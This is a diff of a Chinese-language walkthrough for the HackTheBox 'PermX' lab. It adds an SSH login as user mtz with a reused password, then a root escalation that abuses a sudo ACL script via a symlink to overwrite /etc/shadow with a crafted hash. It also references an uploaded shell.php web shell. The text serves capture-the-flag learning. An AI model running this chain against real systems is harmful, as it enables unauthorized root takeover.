@@ -132,45 +132,47 @@ curl 'http://lms.permx.htb/main/inc/lib/javascript/bigupload/files/shell.php'
 
 <figure><img src="../../.gitbook/assets/25 (2).png" alt=""><figcaption></figcaption></figure>
 
-* 通过以上
+* 通过以上可知目标机器上的用户里并没有chamilo这个用户名，并且在/home目录中有个/mtz的目录无权访问，而/etc/passwd里正好有这个用户名，于是利用刚才的密码和mtz这个用户名进行ssh登录尝试，成功：
 
+```bash
+ssh mtz@10.129.76.98
+03F6lY3uXAP2bkW8
+```
 
+<figure><img src="../../.gitbook/assets/26 (2).png" alt=""><figcaption></figcaption></figure>
 
 ## 权限提升
 
 ### 本地信息枚举
 
+* 经过初步的手动枚举，\`sudo -l\`发现了当前可以用sudo身份执行且无需密码的文件是/opt目录下的acl.sh文件，阅读该文件中的代码可得知该脚本是用于指定用户对特定文件的访问权限的，并且要求必须是在/home/mtz/目录下进行的：
 
-
-
-
-### 漏洞查阅
-
-
-
-
-
-
+<figure><img src="../../.gitbook/assets/27 (2).png" alt=""><figcaption></figcaption></figure>
 
 ### 漏洞利用
 
+* 由于该脚本可以修改/home/mtz/目录下的所有的文件权限，那么这就意味着我可以使用符号链接攻击将/etc/shadow文件映射到这里，修改其root密码即可完成提权：
 
+```bash
+# 当前所处的位置应就是/home/mtz/目录下：
+ln -s / root
+ls -l
+sudo /opt/acl.sh mtz rwx /home/mtz/root/etc/shadow
+echo 'root:$6$tPR3EAkzdPCSN2hT$fwoI8zEzWpKFxmw8JlLFjczHcd1sdLTXzIZuXUx6qwKdG3u2ynkEsDRxx/kf24WAI7gvgiqo.6r6qJ9uEecPs/:19742:0:99999:7:::' >/etc/shadow
+su root
+```
 
+* 因为这里是需要修改/etc/passwd文件中的root的密码hash部分，所以，需要事先制作一个自定义的root账户的密码hash：
 
+```bash
+openssl passwd -6 fiii
+```
 
-
+<figure><img src="../../.gitbook/assets/28 (2).png" alt=""><figcaption></figcaption></figure>
 
 ### ROOT
 
-
-
-
-
-
-
-
-
-
+<figure><img src="../../.gitbook/assets/29 (2).png" alt=""><figcaption></figcaption></figure>
 
 {% hint style="info" %}
 本例简单偏中等难度，在get shell阶段，锁定对了漏洞后就非常简单；提权阶段需要搞清楚当前低权限账户有完全控制权的那个文件的具体用法后，才能提权成功。
